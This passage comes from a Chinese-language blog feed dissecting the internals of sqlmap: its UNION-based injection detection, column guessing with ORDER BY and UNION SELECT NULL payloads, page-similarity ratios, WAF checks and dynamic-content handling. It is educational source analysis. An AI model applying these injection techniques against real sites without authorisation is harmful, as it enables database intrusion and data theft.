return delta &amp;gt;= 0&lt;/code&gt;&lt;p&gt;这一段代码作为 mysql 的 Patch 存在 &lt;code class=&quot;inline&quot;&gt;# MySQL&#39;s SLEEP(X) lasts 0.05 seconds shorter on average&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;如果我们要自己实现时间盲注的检测的话，这一点也是必须注意和实现的。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;针对 UNION 型（UNION Query）&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;UNION 注入可以说是 sqlmap 中最复杂的了，同时也是最经典的注入情形。&lt;/p&gt;&lt;p&gt;其实关于 UNION 注入的检测，和我们一开始学习 SQL 注入的方法是一样的，猜解列数，猜解输出点在列中位置。实际在 sqlmap 中也是按照这个来进行漏洞检测的，具体的测试方法位于：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-110a1145556b933e5ac2e73ff298f714_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;833&quot; data-rawheight=&quot;526&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-110a1145556b933e5ac2e73ff298f714&quot; data-watermark-src=&quot;v2-f370bebaeaefc7c866ba0c982e1a2c68&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;跟入 &lt;code class=&quot;inline&quot;&gt;unionTest()&lt;/code&gt; 中我们发现如下操作&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;
def unionTest(comment, place, parameter, value, prefix, suffix):
    &quot;&quot;&quot;
    This method tests if the target URL is affected by an union
    SQL injection vulnerability. The test is done up to 3*50 times
    &quot;&quot;&quot;
​
    if conf.direct:
        return
​
    kb.technique = PAYLOAD.TECHNIQUE.UNION
    validPayload, vector = _unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix)
​
    if validPayload:
        validPayload = agent.removePayloadDelimiters(validPayload)
​
    return validPayload, vector&lt;/code&gt;&lt;p&gt;最核心的逻辑位于 &lt;code class=&quot;inline&quot;&gt;_unionTestByCharBruteforce&lt;/code&gt; 中，继续跟入，我们发现其检测的大致逻辑如下：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c529ff3eaf28512368b2b2045da53140_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1501&quot; data-rawheight=&quot;674&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-c529ff3eaf28512368b2b2045da53140&quot; data-watermark-src=&quot;v2-6e6e8a25b589fb0a620495fd84a30b6d&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;别急，我们一步一步来分析！&lt;/p&gt;&lt;h2&gt;&lt;b&gt;猜列数&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我相信做过渗透测试的读者基本对这个词都非常非常熟悉，如果有疑问或者不清楚的请自行百度，笔者再次不再赘述关于 SQL 注入基本流程的部分。&lt;/p&gt;&lt;p&gt;为什么要把一件这么简单的事情单独拿出来说呢？当然这预示着 sqlmap 并不是非常简单的在处理这一件事情，因为作为一个渗透测试人员，当然可以很容易靠肉眼分辨出很多事情，但是这些事情在计算机看来却并不是那么容易可以判断的：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;使用 ORDER BY 查询，直接通过与模版页面的比较来获取列数。&lt;/li&gt;&lt;li&gt;当 ORDER BY 失效的时候，使用多次 &lt;code class=&quot;inline&quot;&gt;UNION SELECT&lt;/code&gt; 不同列数，获取多个 Ratio，通过区分 Ratio 来区分哪一个是正确的列数。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;实际在使用的过程中，&lt;code class=&quot;inline&quot;&gt;ORDER BY&lt;/code&gt; 的核心逻辑如下，关于其中页面比较技术我们就不赘述了，不过值得一提的是 sqlmap 在猜列数的时候，使用的是二分法（笔者看了一下，二分法这部分这似乎是七年前的代码）。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c8fa713e11133d2c091345e8dc9fc2a5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1349&quot; data-rawheight=&quot;631&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-c8fa713e11133d2c091345e8dc9fc2a5&quot; data-watermark-src=&quot;v2-16cf9c8de071ee650d2e9c30bfd68109&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;除此之外呢，如果 &lt;code class=&quot;inline&quot;&gt;ORDER BY&lt;/code&gt; 失效，将会计算至少五个（从 &lt;code class=&quot;inline&quot;&gt;lowerCount&lt;/code&gt; 到 &lt;code class=&quot;inline&quot;&gt;upperCount&lt;/code&gt;）Payload 为 &lt;code class=&quot;inline&quot;&gt;UNION SELECT (NULL,) * [COUNT]&lt;/code&gt;，的请求，这些请求的对应 RATIO（与模版页面相似度）会汇总存储在 &lt;code class=&quot;inline&quot;&gt;ratios&lt;/code&gt; 中，同时 &lt;code class=&quot;inline&quot;&gt;items&lt;/code&gt; 中存储 &lt;code class=&quot;inline&quot;&gt;列数 和 ratio&lt;/code&gt; 形成的 &lt;code class=&quot;inline&quot;&gt;tuple&lt;/code&gt;，经过一系列的算法，尽可能寻找出“与众不同（正确猜到列数）”的页面。具体的算法与批注如下：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9ece5b4a703e99bd41426ac3912dbe0e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1427&quot; data-rawheight=&quot;702&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9ece5b4a703e99bd41426ac3912dbe0e&quot; data-watermark-src=&quot;v2-b38dc8a4df45594a0df0b4d234fbf36a&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;我们发现，上面代码表达的核心思想就是 &lt;b&gt;利用与模版页面比较的内容相似度寻找最最不同的那一个请求&lt;/b&gt;。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;定位输出点&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;假如一切顺利，我们通过上面的步骤成功找到了列数，接下来就应该寻找输出点，当然输出点的寻找也是需要额外讨论的。其实基本逻辑很容易对不对？我们只需要将 &lt;code class=&quot;inline&quot;&gt;UNION SELECT NULL, NULL, NULL, NULL, ...&lt;/code&gt; 中的各种 &lt;code class=&quot;inline&quot;&gt;NULL&lt;/code&gt; 依次替换，然后在结果中寻找被我们插入的随机的字符串，就可以很容易定位到输入出点的位置。实际上这一部分的确认逻辑是位于下图中的函数的 &lt;code class=&quot;inline&quot;&gt;_unionConfirm&lt;/code&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e3b392f7ef6cd59242acadc60c82d38b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;783&quot; data-rawheight=&quot;441&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-e3b392f7ef6cd59242acadc60c82d38b&quot; data-watermark-src=&quot;v2-98d8b68fa58780554eece325888eb731&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;其中主要的逻辑是一个叫 &lt;code class=&quot;inline&quot;&gt;_unionPosition&lt;/code&gt; 的函数，在这个函数中，负责定位输出点的位置，使用的基本方法就是我们在开头提到方法，受限于篇幅，我们就不再展开叙述了。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x03 结束语&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;其实按笔者原计划，本系列文章并没有结束，因为还有关于 sqlmap 中其他技术没有介绍：“数据持久化”，“action() - Exploit 技术”，“常见漏洞利用分析（udf，反弹 shell 等）”。但是由于内容是在太过庞杂，笔者计划暂且搁置一下，实际上现有的文章已经足够把 sqlmap 的 SQL 注入检测最核心的也是最有意义的自动化逻辑说清楚了，我想读读者读完之后肯定会有自己的收获。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x04 再见👋&lt;/b&gt;&lt;/h2&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2018-09-25-45291193</guid>
<pubDate>Tue, 25 Sep 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>sqlmap 内核分析 II: 核心原理-页面相似度算法实践</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-09-10-44157153.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/44157153&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-8189a97bf692ad57084cd2d670824522_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.zhihu.com/people/af8bd4cc442c1349ed0f46baff19e3fd&quot;&gt;@v1ll4n&lt;/a&gt;&lt;/p&gt;&lt;p&gt;安全研发工程师，现就职于长亭科技，喜欢喵喵&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在上一篇文章中，我们在 &lt;code class=&quot;inline&quot;&gt;checkWaf()&lt;/code&gt; 中戛然而止于 &lt;code class=&quot;inline&quot;&gt;page ratio&lt;/code&gt; 这一个概念；但是在本文，笔者会详细介绍 &lt;code class=&quot;inline&quot;&gt;page ratio&lt;/code&gt; 对于 sqlmap 整个系统的重要意义和用法，除此之外还会指出一些 sqlmap 的核心逻辑和一些拓展性的功能。包含：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;identityWaf&lt;/li&gt;&lt;li&gt;nullConnection (checkNullConnection)&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;0x00 PageRatio 是什么？&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;要说 PageRatio 是什么，我们可能需要先介绍另一个模块 &lt;code class=&quot;inline&quot;&gt;difflib&lt;/code&gt;。这个模块是在 sqlmap 中用来计算页面的相似度的基础模块，实际处理的时候，sqlmap 并不仅仅是直接计算页面的相似度，而是通过首先对页面进行一些预处理，预处理之后，根据预设的阈值来计算请求页面和模版页面的相似度。&lt;/p&gt;&lt;p&gt;对于 &lt;code class=&quot;inline&quot;&gt;difflib&lt;/code&gt; 模块其实本身并没有什么非常特殊的，详细参见&lt;a href=&quot;https://docs.python.org/2/library/difflib.html&quot;&gt;官方手册&lt;/a&gt;，实际在使用的过程中，sqlmap 主要使用其 &lt;code class=&quot;inline&quot;&gt;SequenceMatcher&lt;/code&gt; 这个类。以下是关于这个类的简单介绍：&lt;/p&gt;&lt;blockquote&gt;This is a flexible class for comparing pairs of sequences of any type, so long as the sequence elements are hashable. The basic algorithm predates, and is a little fancier than, an algorithm published in the late 1980’s by Ratcliff and Obershelp under the hyperbolic name “gestalt pattern matching.” The idea is to find the longest contiguous matching subsequence that contains no “junk” elements (the Ratcliff and Obershelp algorithm doesn’t address junk). The same idea is then applied recursively to the pieces of the sequences to the left and to the right of the matching subsequence. This does not yield minimal edit sequences, but does tend to yield matches that “look right” to people.&lt;/blockquote&gt;&lt;p&gt;简单来说这个类使用了 Ratcliff 和 Obershelp 提供的算法，匹配最长相同的字符串，设定无关字符（junk）。在实际使用中，他们应用最多的方法应该就是 &lt;code class=&quot;inline&quot;&gt;ratio()&lt;/code&gt;。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-e5dbeda98af8e9230aa17a3cdd8ceba7_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1589&quot; data-rawheight=&quot;139&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;根据文档中的描述，这个方法返回两段文本的相似度，相似度的算法如下：我们假设两段文本分别为 &lt;code class=&quot;inline&quot;&gt;text1&lt;/code&gt; 与 &lt;code class=&quot;inline&quot;&gt;text2&lt;/code&gt;，他们相同的部分长度总共为 &lt;code class=&quot;inline&quot;&gt;M&lt;/code&gt;，这两段文本长度之和为 &lt;code class=&quot;inline&quot;&gt;T&lt;/code&gt;，那么这两段文本的相似度定义为 &lt;code class=&quot;inline&quot;&gt;2.0 * M / T&lt;/code&gt;，这个相似度的值在 0 到 1.0 之间。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;PageRatio 的小例子&lt;/b&gt;&lt;/h2&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4ca7c268277f6f9afbe5b194d24796dc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;481&quot; data-rawheight=&quot;229&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-4ca7c268277f6f9afbe5b194d24796dc&quot; data-watermark-src=&quot;v2-284abfab7f0d229fa22bf82cae412512&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们通过上面的介绍，知道了对于 &lt;code class=&quot;inline&quot;&gt;abcdefg&lt;/code&gt; 和 &lt;code class=&quot;inline&quot;&gt;abce123&lt;/code&gt; 我们计算的结果应该是 &lt;code class=&quot;inline&quot;&gt;2.0 * 4 / 14&lt;/code&gt; 所以计算结果应该是：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-33d7ed32fcaeee58a5f0b418666567f0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;233&quot; data-rawheight=&quot;37&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;到现在我们理解了 PageRatio 是什么样的一种算法，我们就可以开始观察 sqlmap 是如何使用这一个值的了～&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x01 RATIO in checkWaf&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在上节的内容中，我们对于 sqlmap 的源码了解到 &lt;code class=&quot;inline&quot;&gt;checkWaf&lt;/code&gt; 的部分，结合刚才讲的 PageRatio 的例子，我们直接可以看懂这部分代码：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-0daf035189288e98edbec8cf7cb500f8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1186&quot; data-rawheight=&quot;185&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;现在设定 &lt;code class=&quot;inline&quot;&gt;IDS_WAF_CHECK_RATIO = 0.5&lt;/code&gt; 表明，只要打了检测 IDS/WAF 的 Payload 的页面结果与模版页面结果文本页面经过一定处理，最后比较出相似度相差 0.5 就可以认为触发了 IDS/WAF。&lt;/p&gt;&lt;p&gt;与 &lt;code class=&quot;inline&quot;&gt;checkWaf&lt;/code&gt; 相关的其实还有 &lt;code class=&quot;inline&quot;&gt;identityWaf&lt;/code&gt;, 但是这个方法太简单了我们并不想仔细分析，有兴趣的读者可以自行了解一下，本文选择直接跳过这一个步骤。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x02 checkStability&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这个函数其实是在检查原始页面是存在动态内容，并做一些处理。何为动态内容？在 sqlmap 中表示以同样的方式访问量次同一个页面，访问前后页面内容并不是完全相同，他们相差的内容属于动态内容。当然，sqlmap 的处理方式也并不是随意的比较两个页面就没有然后了，在比较完之后，如果存在动态页面，还会做一部分的处理，或者提出扩展设置（&lt;code class=&quot;inline&quot;&gt;--string/--regex&lt;/code&gt;），以方便后续使用。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1440e57d7b4efd880a250213aa64f20e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1184&quot; data-rawheight=&quot;780&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-1440e57d7b4efd880a250213aa64f20e&quot; data-watermark-src=&quot;v2-fbc8433d6a32ac6eb6edb03beb65f110&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们发现，实际的 sqlmap 源码确实是按照我们介绍的内容处理的，如果页面内容是动态的话，则会提示用户处理字符串或者增加正则表达式来验证页面。&lt;/p&gt;&lt;blockquote&gt;默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用--string参数添加字符串，--regexp添加正则），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（--not-string添加）。用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数--code=200。&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;checkDynamicContent(firstPage, secondPage)&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们发现，如果说我们并没指定 &lt;code class=&quot;inline&quot;&gt;string / regex&lt;/code&gt; 那么很多情况，我们仍然也可以正确得出结果；根据 sqlmap 源码，它实际上背后还是有一些处理方法的，而这些方法就在 &lt;code class=&quot;inline&quot;&gt;checkDynamicContent(firstPage, secondPage)&lt;/code&gt; 中：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-5d809fdef4992d3325d0eb191a29b70a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1188&quot; data-rawheight=&quot;699&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-5d809fdef4992d3325d0eb191a29b70a&quot; data-watermark-src=&quot;v2-42eaf7b0265856ba73b5d5345e111776&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们在这个函数中发现如果 &lt;code class=&quot;inline&quot;&gt;firstPage 和 secondPage&lt;/code&gt; 的相似度小于 0.98 （这个相似度的概念就是前一节介绍的 PageRatio 的概念），则会重试，并且尝试 &lt;code class=&quot;inline&quot;&gt;findDynamicContent(firstPage, secondPage)&lt;/code&gt; 然后细化页面究竟是 &lt;code class=&quot;inline&quot;&gt;too dynamic&lt;/code&gt; 还是 &lt;code class=&quot;inline&quot;&gt;heavily dynamic&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;如果页面是 &lt;code class=&quot;inline&quot;&gt;too dynamic&lt;/code&gt; 则提示启用 &lt;code class=&quot;inline&quot;&gt;--text-only&lt;/code&gt; 选项：&lt;/p&gt;&lt;blockquote&gt;有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用--text-only（HTTP响应体中不同）--titles（HTML的title标签中不同）。&lt;/blockquote&gt;&lt;p&gt;如果页面仅仅是显示 &lt;code class=&quot;inline&quot;&gt;heavy dynamic&lt;/code&gt; 的话，sqlmap 会不断重试直到区分出到底是 &lt;code class=&quot;inline&quot;&gt;too dynamic&lt;/code&gt; 还是普通的可以接受的动态页面（相似度大于 0.98）。&lt;/p&gt;&lt;p&gt;对于 &lt;code class=&quot;inline&quot;&gt;too dynamic&lt;/code&gt; 与可以接受的动态页面（相似度高于 0.98），其实最根本的区别就是在于 PageRatio, 如果多次尝试（超过 conf.retries） 设置的尝试次数，仍然出现了相似度低于 0.98 则会认为这个页面 &lt;code class=&quot;inline&quot;&gt;too dynamic&lt;/code&gt;。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;findDynamicContent(firstPage, secondPage)&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这个函数位于 &lt;code class=&quot;inline&quot;&gt;common.py&lt;/code&gt; 中，这个函数作为通用函数，我们并不需要非常严格的去审他的源码，为了节省大家的时候，笔者在这里可以描述这个函数做了一件什么样的事情，并举例说明。&lt;/p&gt;&lt;p&gt;这个函数按函数名来解释其实是，寻找动态的页面内容。&lt;/p&gt;&lt;p&gt;实际在工作中，如果寻找到动态内容，则会将动态内容的前后内容（前：&lt;code class=&quot;inline&quot;&gt;prefix&lt;/code&gt;，后：&lt;code class=&quot;inline&quot;&gt;suffix&lt;/code&gt;，长度均在 &lt;code class=&quot;inline&quot;&gt;DYNAMICITY_BOUNDARY_LENGTH&lt;/code&gt; 中设定，默认为 20）作为一个 tuple，存入 &lt;code class=&quot;inline&quot;&gt;kb.dynamicMarkings&lt;/code&gt;，在每一次页面比较之前，会默认移除这些动态内容。&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;kb.dynamicMarkings.append((prefix if prefix else None, suffix if suffix else None))&lt;/code&gt;&lt;p&gt;例如，在实际使用中，我们按照官方给定的一个例子：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
    &quot;&quot;&quot;
    This function checks if the provided pages have dynamic content. If they
    are dynamic, proper markings will be made
                          
    &amp;gt;&amp;gt;&amp;gt; findDynamicContent(&quot;Lorem ipsum dolor sit amet, congue tation referrentur ei sed. Ne nec legimus habemus recusabo, natum reque et per. Facer tritani reprehendunt eos id, modus constituam est te. Usu sumo indoctum ad, pri paulo molestiae complectitur no.&quot;, 
                           &quot;Lorem ipsum dolor sit amet, congue tation referrentur ei sed. Ne nec legimus habemus recusabo, natum reque et per. &amp;lt;script src=&#39;ads.js&#39;&amp;gt;&amp;lt;/script&amp;gt;Facer tritani reprehendunt eos id, modus constituam est te. Usu sumo indoctum ad, pri paulo molestiae complectitur no.&quot;)
    &amp;gt;&amp;gt;&amp;gt; kb.dynamicMarkings
    [(&#39;natum reque et per. &#39;, &#39;Facer tritani repreh&#39;)]
    &quot;&quot;&quot;&lt;/code&gt;&lt;p&gt;根据观察，两段文本差别在 &lt;code class=&quot;inline&quot;&gt;script&lt;/code&gt; 标签，标记的动态内容应该是 &lt;code class=&quot;inline&quot;&gt;script&lt;/code&gt; 标签，所以动态内容的前 20 字节的文本座位 &lt;code class=&quot;inline&quot;&gt;prefix&lt;/code&gt; 后 20 字节的文本作为 &lt;code class=&quot;inline&quot;&gt;suffix&lt;/code&gt;，分别为：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;prefix: &lt;code class=&quot;inline&quot;&gt;&#39;natum reque et per. &#39;&lt;/code&gt;&lt;/li&gt;&lt;li&gt;suffix: &lt;code class=&quot;inline&quot;&gt;&#39;Facer tritani repreh&#39;&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;0x03 中场休息与阶段性总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们虽然之分析了两个大函数，但是整个判断页面相应内容的核心原理应该是已经非常清晰了；可能有些读者反馈我们的进度略慢，但是其实这好比一个打基础的过程，我们基础越扎实对 sqlmap 越熟悉，分析后面的部分就越快。&lt;/p&gt;&lt;p&gt;为了更好的继续，我们需要回顾一下之前的流程图&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-09f240e25764349996a613036b3e4b0a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;660&quot; data-rawheight=&quot;395&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-09f240e25764349996a613036b3e4b0a&quot; data-watermark-src=&quot;v2-c58c5090cd22742c8b9f9698636c40c3&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;好的，接下来我们的目标就是图中描述的部分“过滤重复以及不需要检查的参数，然后检查参数是为动态参数”，在下一篇文章中，我们将会详细介绍 sqlmap 其他的核心函数，诸如启发式检测，和 sql 注入检测核心函数。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x04 参数预处理以及动态参数检查&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;参数预处理&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;参数预处理包含如下步骤：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;参数排序&lt;br&gt;# Order of testing list (first to last)&lt;br&gt;orderList = (PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER, PLACE.URI, PLACE.POST, PLACE.GET)&lt;br&gt;​&lt;br&gt;for place in orderList[::-1]:&lt;br&gt; if place in parameters:&lt;br&gt; parameters.remove(place)&lt;br&gt; parameters.insert(0, place)&lt;/li&gt;&lt;li&gt;参数分级检查&lt;br&gt;&lt;br&gt;for place in parameters:&lt;br&gt; # Test User-Agent and Referer headers only if&lt;br&gt; # --level &amp;gt;= 3&lt;br&gt; skip = (place == PLACE.USER_AGENT and conf.level &amp;lt; 3)&lt;br&gt; skip |= (place == PLACE.REFERER and conf.level &amp;lt; 3)&lt;br&gt;​&lt;br&gt; # Test Host header only if&lt;br&gt; # --level &amp;gt;= 5&lt;br&gt; skip |= (place == PLACE.HOST and conf.level &amp;lt; 5)&lt;br&gt;​&lt;br&gt; # Test Cookie header only if --level &amp;gt;= 2&lt;br&gt; skip |= (place == PLACE.COOKIE and conf.level &amp;lt; 2)&lt;br&gt;​&lt;br&gt; skip |= (place == PLACE.USER_AGENT and intersect(USER_AGENT_ALIASES, conf.skip, True) not in ([], None))&lt;br&gt; skip |= (place == PLACE.REFERER and intersect(REFERER_ALIASES, conf.skip, True) not in ([], None))&lt;br&gt; skip |= (place == PLACE.COOKIE and intersect(PLACE.COOKIE, conf.skip, True) not in ([], None))&lt;br&gt; skip |= (place == PLACE.HOST and intersect(PLACE.HOST, conf.skip, True) not in ([], None))&lt;br&gt;​&lt;br&gt; skip &amp;amp;= not (place == PLACE.USER_AGENT and intersect(USER_AGENT_ALIASES, conf.testParameter, True))&lt;br&gt; skip &amp;amp;= not (place == PLACE.REFERER and intersect(REFERER_ALIASES, conf.testParameter, True))&lt;br&gt; skip &amp;amp;= not (place == PLACE.HOST and intersect(HOST_ALIASES, conf.testParameter, True))&lt;br&gt; skip &amp;amp;= not (place == PLACE.COOKIE and intersect((PLACE.COOKIE,), conf.testParameter, True))&lt;br&gt;​&lt;br&gt; if skip:&lt;br&gt; continue&lt;br&gt;​&lt;br&gt; if kb.testOnlyCustom and place not in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER):&lt;br&gt; continue&lt;br&gt;​&lt;br&gt; if place not in conf.paramDict:&lt;br&gt; continue&lt;br&gt;​&lt;br&gt; paramDict = conf.paramDict[place]&lt;br&gt;​&lt;br&gt; paramType = conf.method if conf.method not in (None, HTTPMETHOD.GET, HTTPMETHOD.POST) else place&lt;/li&gt;&lt;li&gt;参数过滤&lt;/li&gt;&lt;/ol&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-3449ea6acc9fc11700479e927f570242_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1490&quot; data-rawheight=&quot;728&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-3449ea6acc9fc11700479e927f570242&quot; data-watermark-src=&quot;v2-ff650ae113fc375acf08cf0865584366&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;checkDynParam(place, parameter, value)&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们进入 &lt;code class=&quot;inline&quot;&gt;checkDynParam&lt;/code&gt; 函数发现，整个函数其实看起来非常简单，但是实际上我们发现 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; 这个函数现在又返回了一个好像是 Bool 值的返回值作为 &lt;code class=&quot;inline&quot;&gt;dynResult&lt;/code&gt; 这令我们非常困惑，我们上一次见这个函数返回的是 &lt;code class=&quot;inline&quot;&gt;(page, headers, code)&lt;/code&gt; 。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b16ff2abb515c255ba3be9619c11251d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1117&quot; data-rawheight=&quot;664&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-b16ff2abb515c255ba3be9619c11251d&quot; data-watermark-src=&quot;v2-eb0503c02fa3ede2b68a866725b03bed&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们发现实际上的页面比较逻辑也并不是在 &lt;code class=&quot;inline&quot;&gt;checkDynParam&lt;/code&gt; ，所以表面上，我们这一节的内容是在 &lt;code class=&quot;inline&quot;&gt;checkDynParam&lt;/code&gt; 这个函数，但是实际上我们仍然需要跟进到 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;那么，等什么呢？继续吧！&lt;/p&gt;&lt;h2&gt;&lt;b&gt;agent.queryPage 与 comparison&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;跟进 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; 我相信一定是痛苦的，这其实算是 sqlmap 的核心基础函数之一，里面包含了接近三四百行的请求前预处理，包含 &lt;code class=&quot;inline&quot;&gt;tamper&lt;/code&gt; 的处理逻辑以及随机化参数和 CSRF 参数的处理检测逻辑。同时如果涉及到了 &lt;code class=&quot;inline&quot;&gt;timeBasedCompare&lt;/code&gt; 还包含着时间盲注的处理逻辑；除此之外，一般情况下 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; 中还存在着针对页面比较的核心调用，页面对比对应函数为 &lt;code class=&quot;inline&quot;&gt;comparison&lt;/code&gt;。为了简化大家的负担，笔者只截取最后返回值的部分 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; 。&lt;/p&gt;&lt;img 